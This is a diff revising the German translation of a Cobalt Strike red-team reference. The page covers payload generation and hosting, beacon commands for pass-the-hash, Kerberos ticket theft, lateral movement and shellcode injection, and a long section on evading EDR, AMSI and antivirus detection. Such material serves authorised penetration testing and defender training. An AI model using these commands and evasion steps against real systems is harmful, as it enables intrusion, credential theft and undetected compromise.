@@ -6,40 +6,40 @@
 
 ### C2 Listeners
 
-`Cobalt Strike -> Listeners -> Add/Edit` anschließend kannst du auswählen, wo gelauscht werden soll, welche Art von Beacon verwendet werden soll (http, dns, smb...) und mehr.
+`Cobalt Strike -> Listeners -> Add/Edit` dann kannst du auswählen, wo gelauscht werden soll, welche Art von beacon verwendet werden soll (http, dns, smb...) und mehr.
 
 ### Peer2Peer Listeners
 
-Die Beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren, sondern können über andere Beacons mit ihm kommunizieren.
+Die beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren, sondern können über andere beacons mit ihm kommunizieren.
 
-`Cobalt Strike -> Listeners -> Add/Edit` anschließend musst du die TCP- oder SMB-Beacons auswählen.
+`Cobalt Strike -> Listeners -> Add/Edit` dann musst du die TCP- oder SMB-beacons auswählen
 
-* Der **TCP Beacon richtet einen Listener auf dem ausgewählten Port ein**. Um eine Verbindung zu einem TCP Beacon herzustellen, verwende den Befehl `connect <ip> <port>` von einem anderen Beacon aus.
-* Der **SMB Beacon lauscht in einer Pipename mit dem ausgewählten Namen**. Um eine Verbindung zu einem SMB Beacon herzustellen, musst du den Befehl `link [target] [pipe]` verwenden.
+* Der **TCP beacon richtet einen Listener auf dem ausgewählten Port ein**. Um eine Verbindung zu einem TCP beacon herzustellen, verwende den Befehl `connect <ip> <port>` von einem anderen beacon aus
+* Der **smb beacon lauscht in einer pipename mit dem ausgewählten Namen**. Um eine Verbindung zu einem SMB beacon herzustellen, musst du den Befehl `link [target] [pipe]` verwenden.
 
-### Generate & Host payloads
+### Payloads generieren & hosten
 
-#### Generate payloads in files
+#### Payloads in Dateien generieren
 
 `Attacks -> Packages ->`
 
 * **`HTMLApplication`** für HTA-Dateien
-* **`MS Office Macro`** für ein Office-Dokument mit einem Macro
-* **`Windows Executable`** für eine .exe-, .dll- oder Service-.exe-Datei
-* **`Windows Executable (S)`** für eine **stageless** .exe-, .dll- oder Service-.exe-Datei (stageless ist besser als staged, da weniger IoCs entstehen)
+* **`MS Office Macro`** für ein Office-Dokument mit einem Makro
+* **`Windows Executable`** für eine .exe, .dll oder Service-.exe
+* **`Windows Executable (S)`** für eine **stageless** .exe, .dll oder Service-.exe (stageless ist besser als staged, da weniger IoCs entstehen)
 
-#### Generate & Host payloads
+#### Payloads generieren & hosten
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dies generiert ein Script/eine ausführbare Datei zum Herunterladen des Beacons von Cobalt Strike in Formaten wie bitsadmin, exe, powershell und python.
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dadurch wird ein Script/Executable generiert, um den beacon von Cobalt Strike in Formaten wie bitsadmin, exe, powershell und python herunterzuladen
 
-#### Host Payloads
+#### Payloads hosten
 
-Wenn du die Datei, die du auf einem Webserver hosten möchtest, bereits hast, gehe einfach zu `Attacks -> Web Drive-by -> Host File` und wähle die zu hostende Datei sowie die Konfiguration des Webservers aus.
+Wenn du die Datei, die du auf einem Webserver hosten möchtest, bereits hast, gehe zu `Attacks -> Web Drive-by -> Host File` und wähle die zu hostende Datei sowie die Konfiguration des Webservers aus.
 
-### Beacon Options
+### Beacon-Optionen
 
 <details>
-<summary>Beacon options and commands</summary>
+<summary>Beacon-Optionen und Befehle</summary>
 ```bash
 # Execute local .NET binary
 execute-assembly </path/to/executable.exe>
@@ -63,7 +63,7 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 ## Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
 powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
-powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
+powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
 powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
 powerpick Invoke-PrivescAudit | fl
 psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.
@@ -103,7 +103,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
-## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
+## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
 steal_token <pid> #Steal token from process created by mimikatz
 
 ## Pass the ticket
@@ -112,7 +112,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
 make_token <domain>\<username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session & load it
+## Write the ticket on the attacker machine from a PowerShell session and load it
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -125,7 +125,7 @@ steal_token <pid>
 ## Extract ticket + Pass the ticket
 ### List tickets
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### Dump an interesting ticket by LUID
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### Create new logon session, note luid and processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
@@ -143,7 +143,7 @@ jump [method] [target] [listener]
 ## psexec_psh                x86   Use a service to run a PowerShell one-liner
 ## winrm                     x86   Run a PowerShell script via WinRM
 ## winrm64                   x64   Run a PowerShell script via WinRM
-## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)
+## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)
 
 
 remote-exec [method] [target] [command] # remote-exec doesn't return output
@@ -158,7 +158,7 @@ beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
 # Pass session to Metasploit - Through listener
-## On metaploit host
+## On the Metasploit host
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
@@ -179,7 +179,7 @@ ps
 shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
 
 # Pass metasploit session to cobalt strike
-## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
+## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
 ## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
 
 
@@ -194,115 +194,116 @@ beacon> ssh 10.10.17.12:22 username password
 
 ### Custom implants / Linux Beacons
 
-- Ein Custom Agent muss lediglich das HTTP/S-Protokoll des Cobalt Strike Team Servers (standardmäßiges malleable C2 profile) sprechen, um sich zu registrieren/einzuchecken und Tasks zu empfangen. Implementiere dieselben im Profile definierten URIs/Headers/Metadata-Crypto, um die Cobalt Strike UI für Tasking und die Ausgabe wiederzuverwenden.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
-- Ein Aggressor Script (z. B. `CustomBeacon.cna`) kann die Payload-Generierung für den nicht auf Windows basierenden Beacon kapseln, sodass Operatoren den Listener auswählen und ELF-Payloads direkt über die GUI erzeugen können.
-- Beispielhafte Linux-Task-Handler, die dem Team Server bereitgestellt werden: `sleep`, `cd`, `pwd`, `shell` (beliebige Befehle ausführen), `ls`, `upload`, `download` und `exit`. Diese werden auf die vom Team Server erwarteten Task-IDs abgebildet und müssen serverseitig implementiert werden, um die Ausgabe im korrekten Format zurückzugeben.
-- BOF support auf Linux kann durch das In-Process-Laden von Beacon Object Files mit [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) hinzugefügt werden (unterstützt auch Outflank-style BOFs). Dadurch kann modulare Post-Exploitation innerhalb des Kontexts und mit den Privilegien des Implants ausgeführt werden, ohne neue Prozesse zu starten.<sup>[[2]](#references)[[3]](#references)</sup>
-- Bette einen SOCKS-Handler in den Custom Beacon ein, um beim Pivoting die Gleichwertigkeit mit Windows Beacons beizubehalten: Wenn der Operator `socks <port>` ausführt, sollte der Implant einen lokalen Proxy öffnen, um Operator-Tools über den kompromittierten Linux-Host in interne Netzwerke zu routen.
+- Ein benutzerdefinierter Agent muss lediglich das HTTP/S-Protokoll des Cobalt Strike Team Servers (standardmäßiges malleable C2 profile) verwenden, um sich zu registrieren/einzuchecken und Tasks zu empfangen. Implementiere die im Profil definierten URIs/Headers/Metadaten-Kryptografie, um die Cobalt Strike UI für Tasking und die Ausgabe wiederzuverwenden.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
+- Ein Aggressor Script (z. B. `CustomBeacon.cna`) kann die Payload-Generierung für den nicht-Windows Beacon kapseln, sodass Operatoren den Listener auswählen und ELF-Payloads direkt über die GUI erzeugen können.
+- Beispielhafte Linux-Task-Handler, die dem Team Server zur Verfügung gestellt werden: `sleep`, `cd`, `pwd`, `shell` (beliebige Befehle ausführen), `ls`, `upload`, `download` und `exit`. Diese entsprechen den vom Team Server erwarteten Task-IDs und müssen serverseitig implementiert werden, um die Ausgabe im korrekten Format zurückzugeben.
+- BOF-Unterstützung unter Linux kann durch das In-Process-Laden von Beacon Object Files mit [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) hinzugefügt werden (unterstützt auch BOFs im Outflank-Stil). Dadurch kann modulare Post-Exploitation innerhalb des Kontexts und mit den Privilegien des Implants ausgeführt werden, ohne neue Prozesse zu starten.<sup>[[2]](#references)[[3]](#references)</sup>
+- Bette einen SOCKS-Handler in den benutzerdefinierten Beacon ein, um die Pivoting-Funktionalität von Windows Beacons beizubehalten: Wenn der Operator `socks <port>` ausführt, sollte das Implant einen lokalen Proxy öffnen, um die Tools des Operators über den kompromittierten Linux-Host in interne Netzwerke weiterzuleiten.
 
 ## Opsec
 
 ### Execute-Assembly
 
-**`execute-assembly`** verwendet einen **sacrificial process**, der Remote Process Injection nutzt, um das angegebene Programm auszuführen. Dies ist sehr auffällig, da für die Injection in einen Prozess bestimmte Win APIs verwendet werden, die von jedem EDR überprüft werden. Es gibt jedoch einige Custom Tools, mit denen etwas im selben Prozess geladen werden kann:
+**`execute-assembly`** verwendet einen **sacrificial process**, der Remote Process Injection nutzt, um das angegebene Programm auszuführen. Dies ist sehr auffällig, da für die Injection in einen Prozess bestimmte Win-APIs verwendet werden, die von jedem EDR überwacht werden. Es gibt jedoch einige benutzerdefinierte Tools, mit denen etwas im selben Prozess geladen werden kann:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
+- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 - In Cobalt Strike kannst du auch BOF (Beacon Object Files) verwenden: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 
-Das Aggressor Script `https://github.com/outflanknl/HelpColor` erstellt in Cobalt Strike den Befehl `helpx`, der Befehle farblich markiert und anzeigt, ob es sich um BOFs (grün), um Frok&Run (gelb) oder Ähnliches oder um ProcessExecution, Injection oder Ähnliches (rot) handelt. Das hilft dabei zu erkennen, welche Befehle stealthier sind.
+Das Aggressor Script `https://github.com/outflanknl/HelpColor` erstellt den Befehl `helpx` in Cobalt Strike. Dieser färbt Befehle ein und zeigt an, ob es sich um BOFs (grün), Frok&Run (gelb) und Ähnliches oder um ProcessExecution, Injection und Ähnliches (rot) handelt. Das hilft dabei festzustellen, welche Befehle unauffälliger sind.
 
-### Als Benutzer auftreten
+### Als Benutzer agieren
 
 Du könntest Ereignisse wie `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` überprüfen:
 
-- Security EID 4624 - Überprüfe alle interaktiven Logons, um die üblichen Arbeitszeiten zu ermitteln.
-- System EID 12,13 - Überprüfe die Häufigkeit von Shutdowns/Starts/Schlafzuständen.
-- Security EID 4624/4625 - Überprüfe eingehende gültige/ungültige NTLM-Versuche.
-- Security EID 4648 - Dieses Ereignis wird erstellt, wenn Klartext-Credentials für einen Logon verwendet werden. Wenn ein Prozess es erzeugt hat, enthält das Binary möglicherweise die Credentials im Klartext in einer Config-Datei oder im Code.
+- Security EID 4624 – Überprüfe alle interaktiven Logons, um die üblichen Arbeitszeiten zu ermitteln.
+- System EID 12,13 – Überprüfe die Häufigkeit von Herunterfahren, Starten und Ruhezustand.
+- Security EID 4624/4625 – Überprüfe eingehende gültige/ungültige NTLM-Versuche.
+- Security EID 4648 – Dieses Ereignis wird erstellt, wenn Klartext-Credentials zum Logon verwendet werden. Wenn ein Prozess es erzeugt hat, enthält die Binärdatei die Credentials möglicherweise im Klartext in einer Konfigurationsdatei oder im Code.
 
-Wenn du `jump` aus Cobalt Strike verwendest, ist es besser, die Methode `wmi_msbuild` zu nutzen, damit der neue Prozess legitimer aussieht.
+Bei Verwendung von `jump` in Cobalt Strike ist es besser, die Methode `wmi_msbuild` zu verwenden, damit der neue Prozess legitimer aussieht.
 
 ### Computer-Accounts verwenden
 
-Für Defender ist es üblich, auf verdächtige Verhaltensweisen von Benutzern zu prüfen und **Service-Accounts sowie Computer-Accounts wie `*$` aus ihrem Monitoring auszuschließen**. Du könntest diese Accounts für laterale Bewegungen oder Privilege Escalation verwenden.
+Für Defender ist es üblich, ungewöhnliche Verhaltensweisen von Benutzern zu überprüfen und **Service-Accounts sowie Computer-Accounts wie `*$` von ihrer Überwachung auszunehmen**. Du könntest diese Accounts für Lateral Movement oder Privilege Escalation verwenden.
 
-### Stageless Payloads verwenden
+### Stageless-Payloads verwenden
 
-Stageless Payloads sind weniger auffällig als Staged-Payloads, da sie keine zweite Stage vom C2-Server herunterladen müssen. Das bedeutet, dass sie nach der initialen Verbindung keinen Netzwerkverkehr erzeugen und daher mit geringerer Wahrscheinlichkeit von netzwerkbasierten Abwehrmechanismen erkannt werden.
+Stageless-Payloads sind weniger auffällig als gestagte Payloads, da sie keine zweite Stage vom C2-Server herunterladen müssen. Das bedeutet, dass sie nach der initialen Verbindung keinen Netzwerkverkehr erzeugen und daher von netzwerkbasierten Abwehrmaßnahmen schwerer erkannt werden können.
 
 ### Tokens & Token Store
 
-Sei vorsichtig, wenn du Tokens stiehlst oder erzeugst, da es für einen EDR möglich sein könnte, alle Tokens aller Threads aufzulisten und in dem Prozess ein **Token zu finden, das zu einem anderen Benutzer** oder sogar zu SYSTEM gehört.
+Sei beim Stehlen oder Erzeugen von Tokens vorsichtig, da ein EDR Thread-Tokens enumerieren und ein **Token, das zu einem anderen Benutzer gehört**, oder sogar ein SYSTEM-Token innerhalb des Prozesses erkennen kann.
 
-Damit können Tokens **pro Beacon** gespeichert werden, sodass nicht wiederholt dasselbe Token gestohlen werden muss. Dies ist für laterale Bewegungen oder Situationen nützlich, in denen du ein gestohlenes Token mehrfach verwenden musst:
+Dadurch können Tokens **pro Beacon** gespeichert werden, sodass derselbe Token nicht immer wieder gestohlen werden muss. Dies ist für Lateral Movement nützlich oder wenn du einen gestohlenen Token mehrfach verwenden musst:
 
-- token-store steal <pid>
-- token-store steal-and-use <pid>
+- `token-store steal <pid>`
+- `token-store steal-and-use <pid>`
 - token-store show
-- token-store use <id>
-- token-store remove <id>
+- `token-store use <id>`
+- `token-store remove <id>`
 - token-store remove-all
 
-Bei lateralen Bewegungen ist es normalerweise besser, **ein Token zu stehlen, statt ein neues zu erzeugen** oder einen Pass-the-Hash-Angriff durchzuführen.
+Beim Lateral Movement ist es normalerweise besser, **einen Token zu stehlen, statt einen neuen zu erzeugen** oder einen Pass-the-Hash-Angriff durchzuführen.
 
 ### Guardrails
 
-Cobalt Strike verfügt über eine Funktion namens **Guardrails**, die dabei hilft, die Verwendung bestimmter Befehle oder Aktionen zu verhindern, die von Defendern erkannt werden könnten. Guardrails können so konfiguriert werden, dass bestimmte Befehle wie `make_token`, `jump`, `remote-exec` und andere blockiert werden, die häufig für laterale Bewegungen oder Privilege Escalation verwendet werden.
+Cobalt Strike verfügt über eine Funktion namens **Guardrails**, die dabei hilft, die Verwendung bestimmter Befehle oder Aktionen zu verhindern, die von Defendern erkannt werden könnten. Guardrails können so konfiguriert werden, dass bestimmte Befehle wie `make_token`, `jump`, `remote-exec` und andere blockiert werden, die häufig für Lateral Movement oder Privilege Escalation verwendet werden.
 
-Darüber hinaus enthält das Repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ebenfalls einige Checks und Ideen, die du vor dem Ausführen einer Payload berücksichtigen könntest.
+Darüber hinaus enthält das Repository [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) einige Checks und Ideen, die du vor der Ausführung einer Payload berücksichtigen könntest.
 
-### Ticket-Verschlüsselung
+### Tickets encryption
 
-Sei in einer AD-Umgebung vorsichtig mit der Verschlüsselung der Tickets. Standardmäßig verwenden manche Tools RC4-Verschlüsselung für Kerberos-Tickets, die weniger sicher als AES-Verschlüsselung ist. In aktuellen Umgebungen wird standardmäßig AES verwendet. Dies kann von Defendern erkannt werden, die auf schwache Verschlüsselungsalgorithmen überwachen.
+Sei in einer AD-Umgebung vorsichtig mit der Verschlüsselung der Tickets. Standardmäßig verwenden einige Tools RC4-Verschlüsselung für Kerberos-Tickets, die weniger sicher als AES-Verschlüsselung ist. In aktuellen Umgebungen wird standardmäßig AES verwendet. Dies kann von Defendern erkannt werden, die auf schwache Verschlüsselungsalgorithmen überwachen.
 
 ### Defaults vermeiden
 
-Bei der Standardverwendung von Cobalt Stricke heißen die SMB-Pipes `msagent_####` und `"status_####"`. Ändere diese Namen. Die Namen vorhandener Pipes können in Cobal Strike mit dem Befehl `ls \\.\pipe\` überprüft werden.
+Bei der Verwendung von Cobalt Strike heißen die SMB-Pipes standardmäßig `msagent_####` und `"status_####"`. Ändere diese Namen. Die Namen vorhandener Pipes können in Cobalt Strike mit dem Befehl `ls \\.\pipe\` überprüft werden.
 
 Bei SSH-Sessions wird außerdem eine Pipe namens `\\.\pipe\postex_ssh_####` erstellt. Ändere sie mit `set ssh_pipename "<new_name>";`.
 
-Auch beim Post-Exploitation-Angriff können die Pipes `\\.\pipe\postex_####` mit `set pipename "<new_name>"` geändert werden.
+Auch bei Post-Exploitation-Angriffen können die Pipes `\\.\pipe\postex_####` mit `set pipename "<new_name>"` geändert werden.
 
-In Cobalt Strike-Profilen kannst du außerdem Folgendes ändern:
+In Cobalt-Strike-Profilen kannst du außerdem Folgendes ändern:
 
 - Die Verwendung von `rwx` vermeiden
-- Wie das Process-Injection-Verhalten funktioniert (welche APIs verwendet werden) im Block `process-inject {...}`
-- Wie "fork and run" im Block `post-ex {…}` funktioniert
+- Die Funktionsweise der Process Injection festlegen (welche APIs verwendet werden) im Block `process-inject {...}`
+- Die Funktionsweise von "fork and run" im Block `post-ex {…}`
 - Die Sleep-Zeit
-- Die maximale Größe der Binarys, die in den Speicher geladen werden
-- Den Memory Footprint und DLL-Inhalt mit dem Block `stage {...}`
+- Die maximale Größe der Binärdateien, die in den Speicher geladen werden
+- Den Memory-Footprint und den DLL-Inhalt mit dem Block `stage {...}`
 - Den Netzwerkverkehr
 
 ### Memory Scanning umgehen
 
-Einige ERDs scannen den Speicher nach bekannten Malware-Signaturen. Coblat Strike ermöglicht es, die Funktion `sleep_mask` als BOF zu ändern, die das Bacldoor im Speicher verschlüsseln kann.
+Einige EDRs scannen den Speicher nach bekannten Malware-Signaturen. Cobalt Strike ermöglicht es, die Funktion `sleep_mask` als BOF zu ändern, die den Backdoor im Speicher verschlüsseln kann.
 
-### Laute Proc-Injections
+### Laute Proc Injections
 
-Wenn Code in einen Prozess injiziert wird, ist dies normalerweise sehr auffällig. Das liegt daran, dass **kein regulärer Prozess diese Aktion normalerweise ausführt und die Möglichkeiten dafür sehr begrenzt sind**. Daher könnte dies von verhaltensbasierten Detection-Systemen erkannt werden. Außerdem könnte es von EDRs erkannt werden, die das Netzwerk nach **Threads mit Code scannen, der sich nicht auf der Festplatte befindet** (obwohl Prozesse wie Browser, die JIT verwenden, dies häufig tun). Beispiel: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+Wenn Code in einen Prozess injiziert wird, ist dies normalerweise sehr auffällig, weil **kein regulärer Prozess diese Aktion normalerweise ausführt und die Möglichkeiten dafür sehr begrenzt sind**. Daher könnte dies von verhaltensbasierten Erkennungssystemen erkannt werden. Außerdem könnte es von EDRs erkannt werden, die das Netzwerk nach **Threads mit Code durchsuchen, der sich nicht auf der Festplatte befindet** (obwohl dies bei Prozessen wie Browsern, die JIT verwenden, häufig vorkommt). Beispiel: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PID- und PPID-Beziehungen
 
-Beim Starten eines neuen Prozesses ist es wichtig, eine **reguläre Parent-Child**-Beziehung zwischen Prozessen **beizubehalten**, um eine Erkennung zu vermeiden. Wenn svchost.exec iexplorer.exe ausführt, wirkt dies verdächtig, da svchost.exe in einer normalen Windows-Umgebung kein Parent von iexplorer.exe ist.
+Beim Starten eines neuen Prozesses ist es wichtig, eine **reguläre Parent-Child-Beziehung** zwischen Prozessen beizubehalten, um eine Erkennung zu vermeiden. Wenn svchost.exec iexplorer.exe ausführt, wirkt dies verdächtig, da svchost.exe in einer normalen Windows-Umgebung kein Parent von iexplorer.exe ist.
 
-Wenn in Cobalt Strike standardmäßig ein neuer Beacon gestartet wird, wird ein Prozess mit **`rundll32.exe`** erstellt, um den neuen Listener auszuführen. Dies ist nicht besonders stealthy und kann von EDRs leicht erkannt werden. Außerdem wird `rundll32.exe` ohne Argumente ausgeführt, was noch verdächtiger wirkt.
+Wenn in Cobalt Strike standardmäßig ein neuer Beacon gestartet wird, wird ein Prozess mit **`rundll32.exe`** erstellt, um den neuen Listener auszuführen. Dies ist nicht besonders unauffällig und kann von EDRs leicht erkannt werden. Außerdem wird `rundll32.exe` ohne Argumente ausgeführt, was noch verdächtiger wirkt.
 
-Mit dem folgenden Cobalt Strike-Befehl kannst du einen anderen Prozess angeben, der den neuen Beacon startet, wodurch er schwieriger erkannt werden kann:
+Mit dem folgenden Cobalt-Strike-Befehl kannst du einen anderen Prozess angeben, der den neuen Beacon startet, wodurch er schwerer erkannt werden kann:
 ```bash
 spawnto x86 svchost.exe
 ```
-You can also change this setting **`spawnto_x86` und `spawnto_x64`** in a profile.
+You can also change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.
 
-### Den Traffic des Angreifers proxien
+### Proxying attackers traffic
 
-Angreifer müssen manchmal in der Lage sein, Tools lokal auszuführen, sogar auf Linux-Maschinen, und den Traffic der Opfer das Tool erreichen zu lassen (z. B. NTLM relay).
+Angreifer müssen manchmal in der Lage sein, Tools lokal auszuführen, sogar auf Linux machines, und den Datenverkehr der Opfer das Tool erreichen zu lassen (z. B. NTLM relay).
 
-Außerdem ist es bei einem pass-the-hash- oder pass-the-ticket-Angriff manchmal unauffälliger, wenn der Angreifer **diesen Hash oder dieses Ticket lokal in seinen eigenen LSASS-Prozess einfügt** und anschließend darüber pivotiert, anstatt einen LSASS-Prozess auf einer Opfermaschine zu verändern.
+Außerdem ist es für den Angreifer manchmal unauffälliger, bei einem pass-the.hash- oder pass-the-ticket-Angriff **diesen Hash oder dieses Ticket in seinem eigenen LSASS-Prozess** lokal hinzuzufügen und anschließend darüber zu pivotieren, anstatt einen LSASS-Prozess auf dem Computer eines Opfers zu verändern.
 
-Allerdings musst du beim **generierten Traffic vorsichtig** sein, da du möglicherweise ungewöhnlichen Traffic (Kerberos?) aus deinem Backdoor-Prozess sendest. Dafür könntest du in einen Browser-Prozess pivotieren (du könntest jedoch beim Injizieren in einen Prozess entdeckt werden, also überlege dir eine unauffällige Methode dafür).
+Allerdings musst du beim **erzeugten Datenverkehr** vorsichtig sein, da du möglicherweise ungewöhnlichen Datenverkehr (Kerberos?) von deinem Backdoor-Prozess sendest. Dafür könntest du zu einem Browser-Prozess pivotieren (du könntest jedoch beim Injizieren in einen Prozess entdeckt werden, also überlege dir eine unauffällige Methode dafür).
 
 
-### AVs umgehen
+### Avoiding AVs
 
 #### AV/AMSI/ETW Bypass
 
@@ -316,45 +317,45 @@ av-bypass.md
 
 #### Artifact Kit
 
-Normalerweise findest du unter `/opt/cobaltstrike/artifact-kit` den Code und die vorkompilierten Templates (in `/src-common`) für die Payloads, die Cobalt Strike zur Erstellung der binären Beacons verwendet.
+Normalerweise findest du in `/opt/cobaltstrike/artifact-kit` den Code und vorkompilierte Templates (in `/src-common`) für die Payloads, die Cobalt Strike zur Generierung der Binary Beacons verwendet.
 
-Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand des generierten Backdoors (oder einfach anhand des kompilierten Templates) herausfinden, was Defender auslöst. Normalerweise handelt es sich um einen String. Daher kannst du einfach den Code ändern, der das Backdoor generiert, sodass dieser String nicht im finalen Binary erscheint.
+Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand der generierten Backdoor (oder einfach anhand des kompilierten Templates) herausfinden, wodurch Defender ausgelöst wird. Meistens handelt es sich um einen String. Daher kannst du einfach den Code ändern, der die Backdoor generiert, sodass dieser String nicht in der finalen Binary erscheint.
 
-Führe nach der Änderung des Codes einfach `./build.sh` aus demselben Verzeichnis aus und kopiere den Ordner `dist-pipe/` auf den Windows-Client nach `C:\Tools\cobaltstrike\ArtifactKit`.
+Führe nach der Änderung des Codes einfach `./build.sh` aus demselben Verzeichnis aus und kopiere den Ordner `dist-pipe/` auf den Windows client nach `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
-Vergiss nicht, das aggressive Script `dist-pipe\artifact.cna` zu laden, damit Cobalt Strike die gewünschten Ressourcen von der Festplatte verwendet und nicht die bereits geladenen.
+Vergiss nicht, das aggressive Script `dist-pipe\artifact.cna` zu laden, damit Cobalt Strike die gewünschten Ressourcen von der Festplatte und nicht die geladenen verwendet.
 
 #### Resource Kit
 
 Der Ordner ResourceKit enthält die Vorlagen für die scriptbasierten Payloads von Cobalt Strike, einschließlich PowerShell, VBA und HTA.
 
-Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand der Vorlagen herausfinden, was dem Defender (in diesem Fall AMSI) nicht gefällt, und es entsprechend anpassen:
+Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kannst du anhand der Vorlagen herausfinden, was Defender (in diesem Fall AMSI) nicht gefällt, und es entsprechend anpassen:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
-Modifying the detected lines, one can generate a template that won't be caught.
+Durch das Ändern der erkannten Zeilen kann man ein Template erstellen, das nicht erkannt wird.
 
-Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.
+Vergiss nicht, das aggressive Script `ResourceKit\resources.cna` zu laden, um Cobalt Strike anzuweisen, die gewünschten Ressourcen von der Festplatte zu verwenden und nicht die bereits geladenen.
 
 #### Function hooks | Syscall
 
-Function hooking is a very common method for EDRs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or simply jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, one option might be stealthier than the other.
+Function hooking ist eine sehr verbreitete Methode von EDRs, um schädliche Aktivitäten zu erkennen. Cobalt Strike ermöglicht es, diese Hooks zu umgehen, indem **syscalls** anstelle der standardmäßigen Windows-API-Aufrufe verwendet werden. Dazu dient die Konfiguration **`None`**. Alternativ kann mit der Einstellung **`Direct`** die `Nt*`-Version einer Funktion verwendet oder mit der Option **`Indirect`** im malleable profile einfach über die `Nt*`-Funktion gesprungen werden. Je nach System kann eine Option unauffälliger sein als eine andere.
 
-This can be set in the profile or using the command **`syscall-method`**
+Dies kann im Profil oder mit dem Befehl **`syscall-method`** festgelegt werden.
 
-However, this could also be noisy.
+Dies kann jedoch ebenfalls auffällig sein.
 
-One option provided by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).
+Eine von Cobalt Strike bereitgestellte Möglichkeit, Function hooks zu umgehen, besteht darin, diese mit [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) zu entfernen.
 
-You can also check which functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)
+Du kannst auch mit [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) oder [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) überprüfen, welche Funktionen gehookt sind.
 
 
 
 
 <details>
